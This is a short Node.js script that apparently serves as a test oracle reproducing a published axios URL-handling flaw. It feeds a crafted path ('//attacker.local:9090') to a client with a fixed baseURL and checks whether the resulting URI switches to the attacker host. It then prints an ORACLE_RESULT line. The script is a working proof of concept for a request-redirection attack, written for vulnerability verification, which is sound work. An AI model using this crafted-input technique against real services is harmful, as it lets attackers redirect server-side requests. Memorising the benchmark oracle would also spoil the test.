let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

(async () => {
  try {
    const axiosMod = require('axios');
    const axios = axiosMod && axiosMod.default ? axiosMod.default : axiosMod;

    if (!axios || typeof axios.getUri !== 'function' || typeof axios.create !== 'function') {
      throw new Error('axios_api_unavailable');
    }

    const marker = 'ghsa-8hc4-vh64-cxmj';

    // Benign: ordinary relative URL should resolve under baseURL.
    const benignClient = axios.create({ baseURL: 'http://example.test/base' });
    const benignUri = benignClient.getUri({ url: '/users' });
    if (typeof benignUri !== 'string' || benignUri !== 'http://example.test/base/users') {
      throw new Error('benign_resolution_unexpected:' + String(benignUri));
    }

    operation_completed = true;

    // Malicious: path-relative input that turns into protocol-relative form after joining.
    // Vulnerable behavior: treated as absolute/protocol-relative and host switches to attacker.
    // Patched behavior: rejected as invalid URL in server-side mode.
    const maliciousClient = axios.create({ baseURL: 'http://good.local:8080' });
    const userInput = '/attacker.local:9090';
    const crafted = '/' + userInput; // -> '//attacker.local:9090'

    let uri = null;
    let blocked = false;
    try {
      uri = maliciousClient.getUri({ url: crafted });
    } catch (e) {
      blocked = true;
    }

    if (!blocked && typeof uri === 'string') {
      // Exploit considered successful if resulting URI authority is attacker-controlled.
      exploit_succeeded = /^https?:\/\/attacker\.local:9090(?:\/|$)/i.test(uri);
    } else {
      exploit_succeeded = false;
    }

    evidence = JSON.stringify({
      marker,
      benign_uri: benignUri,
      crafted_url: crafted,
      malicious_uri: uri,
      blocked
    });
  } catch (err) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup_or_benign_failed:' + (err && err.message ? err.message : String(err));
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();
